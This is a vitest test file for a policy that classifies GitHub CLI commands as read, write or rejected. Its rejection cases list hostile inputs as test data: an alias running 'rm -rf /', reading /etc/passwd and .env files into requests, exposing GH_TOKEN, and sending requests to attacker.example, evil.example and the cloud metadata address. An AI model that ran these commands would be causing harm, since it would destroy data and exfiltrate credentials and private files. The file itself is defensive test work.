import { expect, test } from 'vitest';
import { classifyGh, GhPolicyError, shellQuote } from './policy.ts';

const classify = (...args: string[]) => classifyGh(args);

test.each([
  ['issue', 'list', '--label', 'bug', '--json', 'number,title'],
  ['issue', 'view', '12', '--comments'],
  ['pr', 'checks', '42'],
  ['pr', 'diff', '42'],
  ['run', 'view', '123', '--log-failed'],
  ['workflow', 'list'],
  ['release', 'list'],
  ['variable', 'get', 'NAME'],
  ['search', 'issues', 'flaky test', 'label:bug'],
  ['repo', 'view', 'chattocorp/chatto'],
  // Branch names and text can contain slashes.
  ['pr', 'list', '--head=dependabot/npm_and_yarn/x'],
  ['run', 'list', '--branch=feature/a/b'],
  ['issue', 'view', 'https://github.com/chattocorp/chatto/issues/1'],
  ['issue', 'list', '-L', '5'],
  ['api', 'repos/{owner}/{repo}/issues/12/comments'],
  ['api', 'search/issues', '-X', 'GET', '-f', 'q=repo:chattocorp/chatto flaky'],
  ['api', 'graphql', '-f', 'query={ repository(owner:"a", name:"b") { id } }']
])('reads run with the read-only token: %j', (...args) => {
  expect(classify(...args)).toEqual({ access: 'read' });
});

test.each([
  // Any change to the repository is available; the App's permissions decide what succeeds.
  ['issue', 'create', '--title', 'Flaky test', '--body', 'Details'],
  ['issue', 'edit', '12', '--add-label', 'bug', '--title', 'Better title'],
  ['issue', 'comment', '12', '--body', 'Fixed in #13'],
  ['issue', 'close', '12', '--reason', 'completed'],
  ['issue', 'lock', '12'],
  ['issue', 'transfer', '12', 'chattocorp/other'],
  ['pr', 'comment', '42', '--body', 'Looks good'],
  ['pr', 'merge', '42', '--squash'],
  ['label', 'delete', 'stale', '--yes'],
  ['label', 'create', 'bug', '-f'],
  ['run', 'rerun', '123', '--failed'],
  ['run', 'cancel', '123'],
  ['workflow', 'run', 'ci.yml', '-f', 'debug=true'],
  ['api', 'repos/{owner}/{repo}/issues/12/labels', '-f', 'labels[]=bug'],
  ['api', '-X', 'DELETE', 'repos/{owner}/{repo}/actions/runs/1'],
  ['api', 'graphql', '-f', 'query=mutation { closeIssue(input:{}) { clientMutationId } }']
])('changes run after the authorization check: %j', (...args) => {
  expect(classify(...args)).toEqual({ access: 'write' });
});

test.each([
  // Programs, credentials, and local configuration.
  [['alias', 'set', 'x', '!rm -rf /']],
  [['extension', 'install', 'someone/gh-thing']],
  [['auth', 'token']],
  [['config', 'set', 'editor', 'vim']],
  [['gist', 'create', 'secret.txt']],
  [['codespace', 'ssh']],
  [['attestation', 'download', 'x']],
  // Local files and Git state.
  [['issue', 'create', '--body-file', '/etc/passwd']],
  [['issue', 'create', '-F', '/etc/passwd']],
  [['release', 'create', 'v1', '/etc/passwd']],
  [['release', 'edit', 'v1', '--notes-file', '/etc/passwd']],
  [['secret', 'set', '--env-file', '.env']],
  [['workflow', 'run', 'ci.yml', '--field', 'x=@/etc/passwd']],
  [['api', 'repos/{owner}/{repo}/issues', '-F', 'body=@/etc/passwd']],
  [['api', 'repos/{owner}/{repo}/issues', '--input', 'payload.json']],
  [['run', 'download', '1']],
  [['release', 'download', 'v1']],
  [['repo', 'clone', 'chattocorp/chatto']],
  [['pr', 'checkout', '42']],
  // Browser and editor.
  [['issue', 'view', '1', '--web']],
  [['issue', 'create', '-e']],
  // The token is in the gh configuration; jq must not read the environment either.
  [['issue', 'list', '--json', 'title', '--jq', '$ENV']],
  // Clusters and attached values hide flags from these checks.
  [['issue', 'view', '1', '--json', 'title', '-cq', '$ENV.GH_TOKEN']],
  [['issue', 'list', '-cRother/repo']],
  [['api', 'repos/{owner}/{repo}/issues/1/comments', '-F=body=@/etc/passwd']],
  [['issue', 'list', '-L5']],
  // Another host or repository.
  [['issue', 'list', '--repo', 'other/repo']],
  [['api', 'repos/{owner}/{repo}', '--hostname', 'evil.example']],
  [['api', 'https://evil.example/steal']],
  [['api', 'repos/chattocorp/chatto/../../user']],
  [['issue', 'view', 'https://attacker.example/o/r/issues/1']],
  [['api', 'repos/{owner}/{repo}/issues', '--unknown-flag']],
  // `--` is the value of a preceding flag for gh, so it must not end the policy's flag scan.
  [['issue', 'create', '--title', '--', '--body-file', 'hosts.yml']],
  [['api', '-t', '--', 'graphql', '-F', 'query=@/etc/passwd']],
  [['search', 'issues', 'flaky', '--', '-label:wontfix']],
  // In secret and variable set, -f is --env-file.
  [['variable', 'set', 'X', '-f', '/abs/path/.env']],
  [['secret', 'set', '-f', '.env']],
  // [HOST/]OWNER/REPO makes gh contact another host.
  [['repo', 'view', 'attacker.example/o/r']],
  [['repo', 'view', '169.254.169.254/o/r']],
  [['issue', 'list', 'ghe.example.com:8443/o/r']],
  // Aliases and local-file subcommands are not on the allowlist.
  [['release', 'new', 'v9.9.9', 'hosts.yml']],
  [['pr', 'co', '42']],
  [['pr', 'create', '--fill']],
  [['repo', 'create', 'x', '--source=.']],
  [['repo', 'deploy-key', 'add', 'key.pub']],
  [['release', 'verify-asset', 'v1', 'file']],
  [['run', 'watch', '1']],
  // Other hosts in any form gh accepts.
  [['repo', 'view', 'git@attacker.example:secret/x']],
  [['repo', 'view', 'localhost/o/r']],
  [['repo', 'view', '[::1]/o/r']],
  [['repo', 'view', 'metadata:8443/o/r']],
  [['repo', 'view', 'https://attacker.example/o/r ']],
  [['issue', 'view', 'https://github.com.attacker.example/o/r/issues/1']],
  [['issue', 'create', '--title', 'See https://attacker.example/x for details']],
  // --attach uploads a local file.
  [['issue', 'comment', '12', '--attach', '/host/path/screenshot.png']],
  // Whitespace after the host does not stop gh from parsing it.
  [['issue', 'transfer', '1', 'evil.example/o/r x']],
  [['repo', 'view', 'evil.example/o x/r']],
  [['repo', 'view', 'git@evil.example:o/r x']],
  // A text flag's separate value is checked too: the previous argument may be a value or a boolean.
  [['repo', 'view', '--branch', '--body', 'evil.example/o/r']],
  [['repo', 'edit', '--template', 'evil.example/o/r']],
  [['pr', 'list', '--head', 'dependabot/npm_and_yarn/x']]
])('the policy rejects %j', (args) => {
  expect(() => classify(...args)).toThrow(GhPolicyError);
});

test('an issue title can mention env with -t', () => {
  expect(classify('issue', 'create', '-t', 'Fix .env loading', '-b', 'x')).toEqual({
    access: 'write'
  });
});

test('shellQuote quotes only when needed', () => {
  expect(shellQuote('issue')).toBe('issue');
  expect(shellQuote("it's a bug")).toBe(`'it'\\''s a bug'`);
  expect(shellQuote('--body=two\nlines')).toBe(`'--body=two\nlines'`);
});
